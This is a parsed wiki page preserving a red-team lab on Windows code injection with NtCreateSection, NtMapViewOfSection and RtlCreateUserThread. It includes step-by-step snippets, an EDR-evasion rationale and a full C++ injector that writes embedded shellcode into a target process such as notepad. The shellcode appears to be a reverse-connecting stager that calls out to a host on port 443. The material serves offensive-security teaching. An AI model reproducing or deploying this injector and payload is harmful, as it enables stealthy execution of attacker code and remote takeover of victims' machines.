---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# NtCreateSection + NtMapViewOfSection Code Injection

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-code-injection-process-injection-ntcreatesection-ntmapviewofsection-code-injection` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/code-injection-process-injection/ntcreatesection-+-ntmapviewofsection-code-injection.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [NtCreateSection + NtMapViewOfSection Code Injection](../../topics/offensive-security/ntcreatesection-ntmapviewofsection-code-injection.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-code-injection-process-injection-ntcreatesection-ntmapviewofsection-code-injection |
| name | NtCreateSection + NtMapViewOfSection Code Injection |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/code-injection-process-injection/ntcreatesection-+-ntmapviewofsection-code-injection.md |

## Preserved Source Material

````yaml
_asset_filenames:
- image (184).png
- image (185).png
- image (186).png
- populating-section-with-shellcode.gif
- rtlcreateuserthreadshell.gif
_body: "# NtCreateSection + NtMapViewOfSection Code Injection\n\n## Overview\n\nThis lab is for a code injection technique\
  \ that leverages Native APIs `NtCreateSection`, `NtMapViewOfSection` and `RtlCreateUserThread`.\n\n* Section is a memory\
  \ block that is shared between processes and can be created with `NtCreateSection` API&#x20;\n* Before a process can read/write\
  \ to that block of memory, it has to map a view of the said section, which can be done with `NtMapViewOfSection`\n* Multiple\
  \ processes can read from and write to the section through the mapped views\n\nHigh level overwiew of the technique:\n\n\
  * Create a new memory section with RWX protection\n* Map a view of the previously created section to the local malicious\
  \ process with RW protection\n* Map a view of the previously created section to a remote target process with RX protection.\
  \ Note that by mapping the views with RW (locally) and RX (in the target process) we do not need to allocate memory pages\
  \ with RWX, which may be frowned upon by some EDRs.\n* Fill the view mapped in the local process with shellcode. By definition,\
  \ the mapped view in the target process will get filled with the same shellcode\n* Create a remote thread in the target\
  \ process and point it to the mapped view in the target process to trigger the shellcode\n\n## Execution\n\nLet's create\
  \ a new memory section in the local process, that will have RWX access rights set:\n\n```cpp\nfNtCreateSection(&sectionHandle,\
  \ SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE,\
  \ SEC_COMMIT, NULL);\n```\n\nWe can see the section got created and we obtained its handle 0x88:\n\n![](<../../.gitbook/assets/image\
  \ (184).png>)\n\nLet's create an RW view of the section in our local process and obtain its address which will get stored\
  \ in `localSectionAddress`:\n\n```cpp\nfNtMapViewOfSection(sectionHandle, GetCurrentProcess(), &localSectionAddress, NULL,\
  \ NULL, NULL, &size, 2, NULL, PAGE_READWRITE);\n```\n\n![](<../../.gitbook/assets/image (185).png>)\n\nLet's create another\
  \ view of the same section in a target process (notepad.exe PID 6572 in our case), but this time with RX protection. The\
  \ memory address of the view will get stored in `remoteSectionAddress` variable:\n\n![](<../../.gitbook/assets/image (186).png>)\n\
  \nWe can now copy the shellcode into our `localSectionAddress`, which will get automatically mirrored/reflected in the `remoteSectionAddress`\
  \ as it's a view of the same section shared between our local and target processes:\n\n```cpp\nmemcpy(localSectionAddress,\
  \ buf, sizeof(buf));\n```\n\nBelow shows how the `localSectionAddress` gets filled with the shellcode and at the same time\
  \ the `remoteSectionAddress` at `0x000002614ed50000` inside notepad (on the right) gets filled with the same shellcode:\n\
  \n![](../../.gitbook/assets/populating-section-with-shellcode.gif)\n\nWe can now create a remote thread inside the notepad.exe\
  \ and make the `remoteSectionAddress` its start address in order to trigger the shellcode:\n\n```cpp\nfRtlCreateUserThread(targetHandle,\
  \ NULL, FALSE, 0, 0, 0, remoteSectionAddress, NULL, &targetThreadHandle, NULL);\n```\n\n![](../../.gitbook/assets/rtlcreateuserthreadshell.gif)\n\
  \n## Code\n\n```cpp\n#include <iostream>\n#include <Windows.h>\n#pragma comment(lib, \"ntdll\")\n\ntypedef struct _LSA_UNICODE_STRING\
  \ { USHORT Length;\tUSHORT MaximumLength; PWSTR  Buffer; } UNICODE_STRING, * PUNICODE_STRING;\ntypedef struct _OBJECT_ATTRIBUTES\
  \ {\tULONG Length; HANDLE RootDirectory; PUNICODE_STRING ObjectName; ULONG Attributes; PVOID SecurityDescriptor;\tPVOID\
  \ SecurityQualityOfService; } OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;\ntypedef struct _CLIENT_ID { PVOID UniqueProcess;\
  \ PVOID UniqueThread; } CLIENT_ID, *PCLIENT_ID;\nusing myNtCreateSection = NTSTATUS(NTAPI*)(OUT PHANDLE SectionHandle, IN\
  \ ULONG DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL, IN PLARGE_INTEGER MaximumSize OPTIONAL, IN ULONG\
  \ PageAttributess, IN ULONG SectionAttributes, IN HANDLE FileHandle OPTIONAL); \nusing myNtMapViewOfSection = NTSTATUS(NTAPI*)(HANDLE\
  \ SectionHandle,\tHANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset,\
  \ PSIZE_T ViewSize, DWORD InheritDisposition, ULONG AllocationType, ULONG Win32Protect);\nusing myRtlCreateUserThread =\
  \ NTSTATUS(NTAPI*)(IN HANDLE ProcessHandle, IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL, IN BOOLEAN CreateSuspended,\
  \ IN ULONG StackZeroBits, IN OUT PULONG StackReserved, IN OUT PULONG StackCommit, IN PVOID StartAddress, IN PVOID StartParameter\
  \ OPTIONAL, OUT PHANDLE ThreadHandle, OUT PCLIENT_ID ClientID);\n\nint main()\n{\n\tunsigned char buf[] = \"\\xfc\\x48\\\
  x83\\xe4\\xf0\\xe8\\xcc\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\\
  x8b\\x52\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\\
  x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\\x20\\x8b\\x42\\x3c\\\
  x48\\x01\\xd0\\x66\\x81\\x78\\x18\\x0b\\x02\\x0f\\x85\\x72\\x00\\x00\\x00\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\\\
  x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\\
  x88\\x48\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\\
  x4c\\x24\\x08\\x45\\x39\\xd1\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\\x48\\x44\\x8b\\x40\\\
  x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\\\
  x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\\x12\\xe9\\x4b\\xff\\xff\\xff\\x5d\\x49\\xbe\\x77\\\
  x73\\x32\\x5f\\x33\\x32\\x00\\x00\\x41\\x56\\x49\\x89\\xe6\\x48\\x81\\xec\\xa0\\x01\\x00\\x00\\x49\\x89\\xe5\\x49\\xbc\\\
  x02\\x00\\x01\\xbb\\x0a\\x00\\x00\\x05\\x41\\x54\\x49\\x89\\xe4\\x4c\\x89\\xf1\\x41\\xba\\x4c\\x77\\x26\\x07\\xff\\xd5\\\
  x4c\\x89\\xea\\x68\\x01\\x01\\x00\\x00\\x59\\x41\\xba\\x29\\x80\\x6b\\x00\\xff\\xd5\\x6a\\x0a\\x41\\x5e\\x50\\x50\\x4d\\\
  x31\\xc9\\x4d\\x31\\xc0\\x48\\xff\\xc0\\x48\\x89\\xc2\\x48\\xff\\xc0\\x48\\x89\\xc1\\x41\\xba\\xea\\x0f\\xdf\\xe0\\xff\\\
  xd5\\x48\\x89\\xc7\\x6a\\x10\\x41\\x58\\x4c\\x89\\xe2\\x48\\x89\\xf9\\x41\\xba\\x99\\xa5\\x74\\x61\\xff\\xd5\\x85\\xc0\\\
  x74\\x0a\\x49\\xff\\xce\\x75\\xe5\\xe8\\x93\\x00\\x00\\x00\\x48\\x83\\xec\\x10\\x48\\x89\\xe2\\x4d\\x31\\xc9\\x6a\\x04\\\
  x41\\x58\\x48\\x89\\xf9\\x41\\xba\\x02\\xd9\\xc8\\x5f\\xff\\xd5\\x83\\xf8\\x00\\x7e\\x55\\x48\\x83\\xc4\\x20\\x5e\\x89\\\
  xf6\\x6a\\x40\\x41\\x59\\x68\\x00\\x10\\x00\\x00\\x41\\x58\\x48\\x89\\xf2\\x48\\x31\\xc9\\x41\\xba\\x58\\xa4\\x53\\xe5\\\
  xff\\xd5\\x48\\x89\\xc3\\x49\\x89\\xc7\\x4d\\x31\\xc9\\x49\\x89\\xf0\\x48\\x89\\xda\\x48\\x89\\xf9\\x41\\xba\\x02\\xd9\\\
  xc8\\x5f\\xff\\xd5\\x83\\xf8\\x00\\x7d\\x28\\x58\\x41\\x57\\x59\\x68\\x00\\x40\\x00\\x00\\x41\\x58\\x6a\\x00\\x5a\\x41\\\
  xba\\x0b\\x2f\\x0f\\x30\\xff\\xd5\\x57\\x59\\x41\\xba\\x75\\x6e\\x4d\\x61\\xff\\xd5\\x49\\xff\\xce\\xe9\\x3c\\xff\\xff\\\
  xff\\x48\\x01\\xc3\\x48\\x29\\xc6\\x48\\x85\\xf6\\x75\\xb4\\x41\\xff\\xe7\\x58\\x6a\\x00\\x59\\x49\\xc7\\xc2\\xf0\\xb5\\\
  xa2\\x56\\xff\\xd5\";\n\t\n\tmyNtCreateSection fNtCreateSection = (myNtCreateSection)(GetProcAddress(GetModuleHandleA(\"\
  ntdll\"), \"NtCreateSection\"));\n\tmyNtMapViewOfSection fNtMapViewOfSection = (myNtMapViewOfSection)(GetProcAddress(GetModuleHandleA(\"\
  ntdll\"), \"NtMapViewOfSection\"));\n\tmyRtlCreateUserThread fRtlCreateUserThread = (myRtlCreateUserThread)(GetProcAddress(GetModuleHandleA(\"\
  ntdll\"), \"RtlCreateUserThread\"));\n\tSIZE_T size = 4096;\n\tLARGE_INTEGER sectionSize = { size };\n\tHANDLE sectionHandle\
  \ = NULL;\n\tPVOID localSectionAddress = NULL, remoteSectionAddress = NULL;\n\t\n\t// create a memory section\n\tfNtCreateSection(&sectionHandle,\
  \ SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE,\
  \ SEC_COMMIT, NULL);\n\t\n\t// create a view of the memory section in the local process\n\tfNtMapViewOfSection(sectionHandle,\
  \ GetCurrentProcess(), &localSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_READWRITE);\n\n\t// create a view of\
  \ the memory section in the target process\n\tHANDLE targetHandle = OpenProcess(PROCESS_ALL_ACCESS, false, 1480);\n\tfNtMapViewOfSection(sectionHandle,\
  \ targetHandle, &remoteSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_EXECUTE_READ);\n\n\t// copy shellcode to the\
  \ local view, which will get reflected in the target process's mapped view\n\tmemcpy(localSectionAddress, buf, sizeof(buf));\n\
  \t\n\tHANDLE targetThreadHandle = NULL;\n\tfRtlCreateUserThread(targetHandle, NULL, FALSE, 0, 0, 0, remoteSectionAddress,\
  \ NULL, &targetThreadHandle, NULL);\n\n\treturn 0;\n}\n```\n\n## References\n\n{% embed url=\"http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtCreateSection.html\"\
  \ %}\n\n{% embed url=\"https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FRtlCreateUserThread.html\"\
  \ %}\n\n{% embed url=\"https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/section-objects-and-views\" %}\n\
  \n{% embed url=\"https://www.forrest-orr.net/post/malicious-memory-artifacts-part-i-dll-hollowing\" %}"
_relative_path: offensive-security/code-injection-process-injection/ntcreatesection-+-ntmapviewofsection-code-injection.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/code-injection-process-injection/ntcreatesection-+-ntmapviewofsection-code-injection.md
````
